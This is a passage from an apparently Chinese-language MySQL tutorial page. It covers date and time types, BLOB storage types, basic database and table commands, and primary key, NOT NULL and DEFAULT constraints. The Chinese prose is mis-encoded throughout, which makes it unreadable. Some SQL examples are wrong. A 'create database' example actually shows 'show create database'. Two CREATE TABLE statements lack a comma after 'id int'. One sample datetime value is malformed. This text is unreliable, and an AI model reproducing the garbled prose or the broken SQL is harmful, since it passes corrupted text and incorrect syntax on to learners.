href="#5-æ—¥æœŸä¸æ—¶é—´ç±»å‹" class="headerlink" title="5.æ—¥æœŸä¸æ—¶é—´ç±»å‹"></a>5.æ—¥æœŸä¸æ—¶é—´ç±»å‹</h2><p>MySQLæä¾›çš„è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´çš„æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ ï¼šYEARã€DATEã€TIMEã€DATETIME å’Œ<br>TIMESTAMPã€‚ä¸‹å›¾åˆ—ä¸¾äº†æ—¥æœŸå’Œæ—¶é—´æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚æ•°ã€å–å€¼èŒƒå›´ã€æ—¥æœŸæ ¼å¼ä»¥åŠé›¶å€¼ï¼š</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­—èŠ‚æ•°</th><th>å–å€¼èŒƒå›´</th><th>æ—¥æœŸæ ¼å¼</th><th>é›¶å€¼</th></tr></thead><tbody><tr><td>YEAR</td><td>1</td><td>1901~2155</td><td>YYYY</td><td>0000</td></tr><tr><td>DATE</td><td>4</td><td>1000-01-01~9999-12-31</td><td>YYYY-MM-DD</td><td>0000-00-00</td></tr><tr><td>TIME</td><td>3</td><td>-838ï¼š59ï¼š59~ 838ï¼š59ï¼š59</td><td>HH:MM:SS</td><td>00:00:00</td></tr><tr><td>DATETIME</td><td>8</td><td>1000-01-01 00:00:00~9999-12-31 23:59:59</td><td>YYYY-MM-DD HH:MM:SS</td><td>0000-00-00 00:00:00</td></tr><tr><td>TIMESTAMP</td><td>4</td><td>1970-01-01 00:00:01~2038-01-19 03:14:07</td><td>YYYY-MM-DD HH:MM:SS</td><td>0000-00-00 00:00:00</td></tr></tbody></table><h3 id="5-1-YEARç±»å‹"><a href="#5-1-YEARç±»å‹" class="headerlink" title="5.1 YEARç±»å‹"></a>5.1 YEARç±»å‹</h3><p>YEARç±»å‹ç”¨äºè¡¨ç¤ºå¹´ä»½ï¼Œåœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ ¼å¼æŒ‡å®šYEARç±»å‹ çš„å€¼ã€‚<br>1ã€ä½¿ç”¨4ä½å­—ç¬¦ä¸²æˆ–æ•°å­—è¡¨ç¤ºï¼ŒèŒƒå›´ä¸ºâ€™1901â€™â€”â€˜2155â€™æˆ–1901â€”2155ã€‚ä¾‹å¦‚ï¼Œè¾“äºº â€˜2019â€™æˆ–2019æ’äººåˆ°æ•°æ®åº“ä¸­çš„å€¼å‡ä¸º2019ã€‚<br>2ã€ä½¿ç”¨ä¸¤ä½å­—ç¬¦ä¸²è¡¨ç¤ºï¼ŒèŒƒå›´ä¸ºâ€™00â€™â€”â€˜99â€™ã€‚å…¶ä¸­ï¼Œâ€˜00â€™â€”â€˜69â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º<br>2000â€”2069èŒƒå›´çš„YEARå€¼ï¼Œâ€˜70â€™â€”â€˜99â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„YEAR<br>å€¼ã€‚ä¾‹å¦‚ï¼Œè¾“äººâ€™19â€™æ’äººåˆ°æ•°æ®åº“ä¸­çš„å€¼ä¸º2019ã€‚<br>3ã€ä½¿ç”¨ä¸¤ä½æ•°å­—è¡¨ç¤ºï¼ŒèŒƒå›´ä¸º1â€”99ã€‚å…¶ä¸­ï¼Œ1â€”69èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º2001â€”<br>2069èŒƒå›´çš„YEARå€¼ï¼Œ70â€”99èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„YEARå€¼ã€‚ä¾‹ å¦‚ï¼Œè¾“äºº19æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„å€¼ä¸º2019ã€‚<br><strong>è¯·æ³¨æ„ ï¼šå½“ä½¿ç”¨YEARç±»å‹æ—¶ï¼Œä¸€å®šè¦åŒºåˆ†â€™0â€™å’Œ0ã€‚å› ä¸ºå­—ç¬¦ä¸²æ ¼å¼çš„â€™0â€™è¡¨ç¤ºçš„YEARå€¼æ˜¯2000è€Œæ•°å­—æ ¼å¼çš„0è¡¨ç¤ºçš„YEARå€¼æ˜¯0000ã€‚</strong></p><h3 id="5-2-TIMEç±»å‹"><a href="#5-2-TIMEç±»å‹" class="headerlink" title="5.2 TIMEç±»å‹"></a>5.2 TIMEç±»å‹</h3><p>TIMEç±»å‹ç”¨äºè¡¨ç¤ºæ—¶é—´å€¼ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸€èˆ¬ä¸ºHH:MM:SSï¼Œå…¶ä¸­ï¼ŒHHè¡¨ç¤ºå°æ—¶ï¼Œ<br>MMè¡¨ç¤ºåˆ†,SSè¡¨ç¤ºç§’ã€‚åœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹3ç§æ ¼å¼æŒ‡å®šTIMEç±»å‹çš„å€¼ã€‚  </p><ol><li><p>ä»¥â€™D HH:MM:SSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºã€‚å…¶ä¸­ï¼ŒDè¡¨ç¤ºæ—¥å¯å–0â€”34ä¹‹é—´çš„å€¼, æ’äººæ•°æ®æ—¶ï¼Œå°æ—¶çš„å€¼ç­‰äº(DX24+HH)ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥â€™2<br>11:30:50â€™æ’äººæ•°æ®åº“ä¸­çš„æ—¥æœŸä¸º59:30:50ã€‚  </p></li><li><p>ä»¥â€™HHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼æˆ–è€…HHMMSSæ•°å­—æ ¼å¼è¡¨ç¤ºã€‚ ä¾‹å¦‚ï¼Œè¾“äººâ€™115454â€™æˆ–115454,æ’å…¥æ•°æ®åº“ä¸­çš„æ—¥æœŸä¸º11:54:54  </p></li><li><p>ä½¿ç”¨CURRENT_TIMEæˆ–NOW()è¾“äººå½“å‰ç³»ç»Ÿæ—¶é—´ã€‚</p></li></ol><h3 id="5-3-DATETIMEç±»å‹"><a href="#5-3-DATETIMEç±»å‹" class="headerlink" title="5.3 DATETIMEç±»å‹"></a>5.3 DATETIMEç±»å‹</h3><p>DATETIMEç±»å‹ç”¨äºè¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸ºâ€™YYYY-MM-DD HH:<br>MM:SSâ€™ï¼Œå…¶ä¸­ï¼ŒYYYYè¡¨ç¤ºå¹´ï¼ŒMMè¡¨ç¤ºæœˆï¼ŒDDè¡¨ç¤ºæ—¥ï¼ŒHHè¡¨ç¤ºå°æ—¶ï¼ŒMMè¡¨ç¤ºåˆ†ï¼ŒSS<br>è¡¨ç¤ºç§’ã€‚åœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹4ç§æ ¼å¼æŒ‡å®šDATETIMEç±»å‹çš„å€¼ã€‚<br>ï‚·ä»¥â€™YYYY-MM-DD HH:MM:SSâ€™æˆ–è€…â€™YYYYMMDDHHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå–å€¼èŒƒå›´ä¸ºâ€™1000-01-0100:00:00â€™â€”â€˜9999-12-3 23:59:59â€™ã€‚ä¾‹å¦‚ï¼Œè¾“äººâ€™2019-01-22 09:01:23â€™æˆ–<br>â€˜20140122_0_90123â€™æ’äººæ•°æ®åº“ä¸­çš„ DATETIME å€¼éƒ½ä¸º 2019-01-22 09:01:23ã€‚  </p><ol><li>ä»¥â€™YY-MM-DD<br>HH:MM:SSâ€™æˆ–è€…â€™YYMMDDHHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå…¶ä¸­YYè¡¨ç¤ºå¹´ï¼Œå–å€¼èŒƒå›´ä¸ºâ€™00â€™â€”â€˜99â€™ã€‚ä¸DATEç±»å‹ä¸­çš„YYç›¸åŒï¼Œâ€˜00â€™â€”<br>â€˜69â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º2000â€”2069èŒƒå›´çš„å€¼ï¼Œâ€˜70â€™â€”â€˜99â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„å€¼ã€‚  </li><li>ä»¥YYYYMMDDHHMMSSæˆ–è€…YYMMDDHHMMSSæ•°å­—æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸ<br>å’Œæ—¶é—´ã€‚ä¾‹å¦‚ï¼Œæ’å…¥20190122090123æˆ–è€…190122090123,æ’äººæ•°æ®åº“ä¸­çš„DATETIMEå€¼éƒ½ ä¸º 2019-01-22 09:01:23ã€‚  </li><li>ä½¿ç”¨NOWæ¥è¾“äººå½“å‰ç³»ç»Ÿçš„æ—¥æœŸå’Œæ—¶é—´ã€‚</li></ol><h3 id="5-4-TIMESTAMPç±»å‹"><a href="#5-4-TIMESTAMPç±»å‹" class="headerlink" title="5.4 TIMESTAMPç±»å‹"></a>5.4 TIMESTAMPç±»å‹</h3><p>TIMESTAMPç±»å‹ç”¨äºè¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸DATETIMEç›¸åŒä½†å–å€¼èŒƒå›´æ¯”DATETIMEå°ã€‚åœ¨æ­¤ï¼Œä»‹ç»å‡ ç§TIMESTAMPç±»å‹ä¸DATATIMEç±»å‹ä¸åŒçš„å½¢å¼ï¼š<br>1ã€ä½¿ç”¨CURRENT_TIMESTAMPè¾“äººç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚<br>2ã€è¾“äººNULLæ—¶ç³»ç»Ÿä¼šè¾“äººç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚<br>3ã€æ— ä»»ä½•è¾“äººæ—¶ç³»ç»Ÿä¼šè¾“å…¥ç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚</p><h2 id="6-äºŒè¿›åˆ¶ç±»å‹"><a href="#6-äºŒè¿›åˆ¶ç±»å‹" class="headerlink" title="6.äºŒè¿›åˆ¶ç±»å‹"></a>6.äºŒè¿›åˆ¶ç±»å‹</h2><p>åœ¨MySQLä¸­å¸¸ç”¨BLOBå­˜å‚¨äºŒè¿›åˆ¶ç±»å‹çš„æ•°æ®ï¼Œä¾‹å¦‚ï¼šå›¾ç‰‡ã€PDFæ–‡æ¡£ç­‰ã€‚BLOBç±»å‹åˆ†ä¸ºå¦‚ä¸‹å››ç§ï¼š</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å‚¨å­˜èŒƒå›´</th></tr></thead><tbody><tr><td>TINYBLOB</td><td>0~255å­—èŠ‚</td></tr><tr><td>BLOB</td><td>0~65535å­—èŠ‚</td></tr><tr><td>MEDIUMBLOB</td><td>0~16777215å­—èŠ‚</td></tr><tr><td>LONGBLOB</td><td>0~4294967295å­—èŠ‚</td></tr></tbody></table><h1 id="å››ã€æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ"><a href="#å››ã€æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å››ã€æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ"></a>å››ã€æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ</h1><h2 id="1-æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ"><a href="#1-æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="1.æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ"></a>1.æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ</h2><p>MySQLå®‰è£…å®Œæˆåï¼Œè¦æƒ³å°†æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“çš„è¡¨ä¸­ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ã€‚åˆ› å»ºæ•°æ®åº“å°±æ˜¯åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­åˆ’åˆ†ä¸€å—ç©ºé—´å­˜å‚¨æ•°æ®ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><p>   <code> create database æ•°æ®åº“åç§°;</code></p><p>åˆ›å»ºä¸€ä¸ªå«db1çš„æ•°æ®åº“MySQLå‘½ä»¤ï¼š</p><p>â€‹    â€“ åˆ›å»ºä¸€ä¸ªå«db1çš„æ•°æ®åº“<br>â€‹   <code> show create database db1;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030312520741.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ›å»ºæ•°æ®åº“åæŸ¥çœ‹è¯¥æ•°æ®åº“åŸºæœ¬ä¿¡æ¯MySQLå‘½ä»¤ï¼š</p><p>   <code> show create database db1;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125330974.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ é™¤æ•°æ®åº“MySQLå‘½ä»¤ï¼š</p><p>  <code>drop database db1;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125647454.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢å‡ºMySQLä¸­æ‰€æœ‰çš„æ•°æ®åº“MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>show databases;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303125940965.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†æ•°æ®åº“çš„å­—ç¬¦é›†ä¿®æ”¹ä¸ºgbk MySQLå‘½ä»¤ï¼š</p><p>  <code>  alter database db1 character set gbk;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303130330527.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ‡æ¢æ•°æ®åº“ MySQLå‘½ä»¤ï¼š</p><p>  <code>  use db1;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303130451230.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select database();</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303130616683.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ"><a href="#2-æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="2.æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ"></a>2.æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ</h2><p>æ•°æ®åº“åˆ›å»ºæˆåŠŸåå¯åœ¨è¯¥æ•°æ®åº“ä¸­åˆ›å»ºæ•°æ®è¡¨(ç®€ç§°ä¸ºè¡¨)å­˜å‚¨æ•°æ®ã€‚è¯·æ³¨æ„ï¼šåœ¨æ“ä½œæ•°æ®è¡¨ä¹‹å‰åº”ä½¿ç”¨â€œUSE<br>æ•°æ®åº“å;â€æŒ‡å®šæ“ä½œæ˜¯åœ¨å“ªä¸ªæ•°æ®åº“ä¸­è¿›è¡Œå…ˆå…³æ“ä½œï¼Œå¦åˆ™ä¼šæŠ›å‡ºâ€œNo database selectedâ€é”™è¯¯ã€‚<br>è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"> create table è¡¨å(<br>         å­—æ®µ1 å­—æ®µç±»å‹,<br>         å­—æ®µ2 å­—æ®µç±»å‹,<br>         â€¦<br>         å­—æ®µn å­—æ®µç±»å‹<br>);<br></code></pre></td></tr></table></figure><h3 id="2-1-åˆ›å»ºæ•°æ®è¡¨"><a href="#2-1-åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="2.1 åˆ›å»ºæ•°æ®è¡¨"></a>2.1 åˆ›å»ºæ•°æ®è¡¨</h3><p>ç¤ºä¾‹ï¼šåˆ›å»ºå­¦ç”Ÿè¡¨ MySQLå‘½ä»¤ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>  id int,<br>   name varchar(20),<br>   gender varchar(10),<br>   birthday date<br>);<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303140044367.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-2-æŸ¥çœ‹æ•°æ®è¡¨"><a href="#2-2-æŸ¥çœ‹æ•°æ®è¡¨" class="headerlink" title="2.2 æŸ¥çœ‹æ•°æ®è¡¨"></a>2.2 æŸ¥çœ‹æ•°æ®è¡¨</h3><p>ç¤ºä¾‹ï¼šæŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>show tables;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303144745383.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šæŸ¥è¡¨çš„åŸºæœ¬ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>show create table student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303144940575.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šæŸ¥çœ‹è¡¨çš„å­—æ®µä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>desc student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303145223522.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-3-ä¿®æ”¹æ•°æ®è¡¨"><a href="#2-3-ä¿®æ”¹æ•°æ®è¡¨" class="headerlink" title="2.3 ä¿®æ”¹æ•°æ®è¡¨"></a>2.3 ä¿®æ”¹æ•°æ®è¡¨</h3><p>æœ‰æ—¶ï¼Œå¸Œæœ›å¯¹è¡¨ä¸­çš„æŸäº›ä¿¡æ¯è¿›è¡Œä¿®æ”¹ï¼Œä¾‹å¦‚ï¼šä¿®æ”¹è¡¨åã€ä¿®æ”¹å­—æ®µåã€ä¿®æ”¹å­—æ®µ æ•°æ®ç±»å‹â€¦ç­‰ç­‰ã€‚åœ¨MySQLä¸­ä½¿ç”¨alter tableä¿®æ”¹æ•°æ®è¡¨.<br>ç¤ºä¾‹ï¼šä¿®æ”¹è¡¨å MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table student rename to stu;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303145645914.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šä¿®æ”¹å­—æ®µå MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table stu change name sname varchar(10);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303150127793.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šä¿®æ”¹å­—æ®µæ•°æ®ç±»å‹ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table stu modify sname int;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210303150426652.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šå¢åŠ å­—æ®µ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table stu add address varchar(50);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303150757176.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¤ºä¾‹ï¼šåˆ é™¤å­—æ®µ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table stu drop address;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210303151816445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg1MTk0NQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-4-åˆ é™¤æ•°æ®è¡¨"><a href="#2-4-åˆ é™¤æ•°æ®è¡¨" class="headerlink" title="2.4 åˆ é™¤æ•°æ®è¡¨"></a>2.4 åˆ é™¤æ•°æ®è¡¨</h3><p>è¯­æ³•ï¼š</p><p>â€‹    <code>drop table è¡¨å;</code></p><p>ç¤ºä¾‹ï¼šåˆ é™¤æ•°æ®è¡¨ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>drop table stu;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210303152039101.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="äº”ã€æ•°æ®è¡¨çš„çº¦æŸ"><a href="#äº”ã€æ•°æ®è¡¨çš„çº¦æŸ" class="headerlink" title="äº”ã€æ•°æ®è¡¨çš„çº¦æŸ"></a>äº”ã€æ•°æ®è¡¨çš„çº¦æŸ</h1><p>ä¸ºé˜²æ­¢é”™è¯¯çš„æ•°æ®è¢«æ’å…¥åˆ°æ•°æ®è¡¨ï¼ŒMySQLä¸­å®šä¹‰äº†ä¸€äº›ç»´æŠ¤æ•°æ®åº“å®Œæ•´æ€§çš„è§„åˆ™ï¼›è¿™äº›è§„åˆ™å¸¸ç§°ä¸ºè¡¨çš„çº¦æŸã€‚å¸¸è§çº¦æŸå¦‚ä¸‹ï¼š</p><table><thead><tr><th>çº¦æŸæ¡ä»¶</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>PRIMARY KEY</td><td>ä¸»é”®çº¦æŸç”¨äºå”¯ä¸€æ ‡è¯†å¯¹åº”çš„è®°å½•</td></tr><tr><td>FOREIGN KEY</td><td>å¤–é”®çº¦æŸ</td></tr><tr><td>NOT NULL</td><td>éç©ºçº¦æŸ</td></tr><tr><td>UNIQUE</td><td>å”¯ä¸€æ€§çº¦æŸ</td></tr><tr><td>DEFAULT</td><td>é»˜è®¤å€¼çº¦æŸï¼Œç”¨äºè®¾ç½®å­—æ®µçš„é»˜è®¤å€¼</td></tr></tbody></table><p>ä»¥ä¸Šäº”ç§çº¦æŸæ¡ä»¶é’ˆå¯¹è¡¨ä¸­å­—æ®µè¿›è¡Œé™åˆ¶ä»è€Œä¿è¯æ•°æ®è¡¨ä¸­æ•°æ®çš„æ­£ç¡®æ€§å’Œå”¯ä¸€æ€§ã€‚æ¢å¥è¯è¯´ï¼Œè¡¨çš„çº¦æŸå®é™…ä¸Šå°±æ˜¯è¡¨ä¸­æ•°æ®çš„é™åˆ¶æ¡ä»¶ã€‚</p><h2 id="1-ä¸»é”®çº¦æŸ"><a href="#1-ä¸»é”®çº¦æŸ" class="headerlink" title="1.ä¸»é”®çº¦æŸ"></a>1.ä¸»é”®çº¦æŸ</h2><p>ä¸»é”®çº¦æŸå³primary<br>keyç”¨äºå”¯ä¸€çš„æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œã€‚è¢«æ ‡è¯†ä¸ºä¸»é”®çš„æ•°æ®åœ¨è¡¨ä¸­æ˜¯å”¯ä¸€çš„ä¸”å…¶å€¼ä¸èƒ½ä¸ºç©ºã€‚è¿™ç‚¹ç±»ä¼¼äºæˆ‘ä»¬æ¯ä¸ªäººéƒ½æœ‰ä¸€ä¸ªèº«ä»½è¯å·ï¼Œå¹¶ä¸”è¿™ä¸ªèº«ä»½è¯å·æ˜¯å”¯ä¸€çš„ã€‚<br>ä¸»é”®çº¦æŸåŸºæœ¬è¯­æ³•ï¼š</p><p>â€‹    <code>å­—æ®µå æ•°æ®ç±»å‹ primary key;</code></p><p><strong>è®¾ç½®ä¸»é”®çº¦æŸ(primary key)çš„ç¬¬ä¸€ç§æ–¹å¼</strong><br>ç¤ºä¾‹ï¼šMySQLå‘½ä»¤ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>id int primary key,<br>name varchar(20)<br>);<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303161028430.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>è®¾ç½®ä¸»é”®çº¦æŸ(primary key)çš„ç¬¬äºŒÂ·ç§æ–¹å¼</strong><br>ç¤ºä¾‹ï¼šMySQLå‘½ä»¤ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student01(<br>id int<br>name varchar(20),<br>primary key(id)<br>);<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303173104926.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-éç©ºçº¦æŸ"><a href="#2-éç©ºçº¦æŸ" class="headerlink" title="2.éç©ºçº¦æŸ"></a>2.éç©ºçº¦æŸ</h2><p>éç©ºçº¦æŸå³ NOT NULLæŒ‡çš„æ˜¯å­—æ®µçš„å€¼ä¸èƒ½ä¸ºç©ºï¼ŒåŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>â€‹<br>â€‹    å­—æ®µå æ•°æ®ç±»å‹ NOT NULL;</p><p>ç¤ºä¾‹ï¼šMySQLå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student02(<br>id int<br>name varchar(20) not null<br>);<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030317340097.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-é»˜è®¤å€¼çº¦æŸ"><a href="#3-é»˜è®¤å€¼çº¦æŸ" class="headerlink" title="3.é»˜è®¤å€¼çº¦æŸ"></a>3.é»˜è®¤å€¼çº¦æŸ</h2><p>é»˜è®¤å€¼çº¦æŸå³DEFAULTç”¨äºç»™æ•°æ®è¡¨ä¸­çš„å­—æ®µæŒ‡å®šé»˜è®¤å€¼ï¼Œå³å½“åœ¨è¡¨ä¸­æ’å…¥ä¸€æ¡æ–°è®°å½•æ—¶è‹¥æœªç»™è¯¥å­—æ®µèµ‹å€¼ï¼Œé‚£ä¹ˆï¼Œæ•°æ®åº“ç³»ç»Ÿä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªå­—æ®µæ’äººé»˜è®¤å€¼ï¼›å…¶åŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>â€‹<br>â€‹    å­—æ®µå æ•°æ®ç±»å‹ DEFAULT 